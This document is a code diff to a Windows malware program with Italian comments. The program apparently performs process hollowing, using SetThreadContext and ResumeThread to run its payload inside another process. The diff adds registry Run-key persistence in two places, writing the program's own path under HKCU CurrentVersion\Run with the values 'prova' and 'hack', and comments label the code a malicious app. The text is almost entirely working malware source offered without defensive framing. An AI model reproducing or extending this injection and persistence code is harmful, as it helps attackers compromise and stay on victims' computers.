@@ -109,7 +109,7 @@ int main(){
 
     void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE
 ////////////////////////
-    char currentFilePath[1024] = "C:\\Windows\\System32\\notepad.exe"; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
+    char currentFilePath[1024]; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
 /////////////////////////
     DOSHeader = PIMAGE_DOS_HEADER(pe);   // assegno a DOSHeader il puntatore al DOSHeader
     NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);  // assegno a NtHeader il puntatore al NtHeader calcolandolo
@@ -135,7 +135,21 @@ int main(){
         Sleep(3000);          
         GetModuleFileNameA(NULL,currentFilePath,sizeof(currentFilePath)); //prendo il path del file .exe che sto eseguendo
         printf("\n\nDOPO GetModuleFileNameA");
-        Sleep(3000);     
+        Sleep(3000);
+        if(TRUE){  //AGGIUNGERE argomento da linea di comando
+            printf("\n creating Registry Run KEY \n"); //rendo il processo persistent
+            HKEY hkey = NULL;
+            // malicious app
+            const char* exe = currentFilePath;
+
+            // startup
+            LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
+            if (res == ERROR_SUCCESS) {
+                // create new registry key
+                RegSetValueEx(hkey, (LPCSTR)"prova", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+                RegCloseKey(hkey);
+            }     
+        }
         /*BOOL CreateProcessA(
             [in, optional]      LPCSTR                lpApplicationName,
             [in, out, optional] LPSTR                 lpCommandLine,
@@ -237,6 +251,19 @@ int main(){
 
                 //setto il contesto (i registri del Process Control Bloc)
                 SetThreadContext(PI.hThread, LPCONTEXT(CTX));
+
+                HKEY hkey = NULL;
+                // malicious app
+                const char* exe = currentFilePath;
+
+                // startup
+                LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
+                if (res == ERROR_SUCCESS) {
+                    // create new registry key
+                    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+                    RegCloseKey(hkey);
+                }
+
                 
                 //riprendo l' esecuzione del processo (quindi eseguo il mio malware)
                 ResumeThread(PI.hThread);
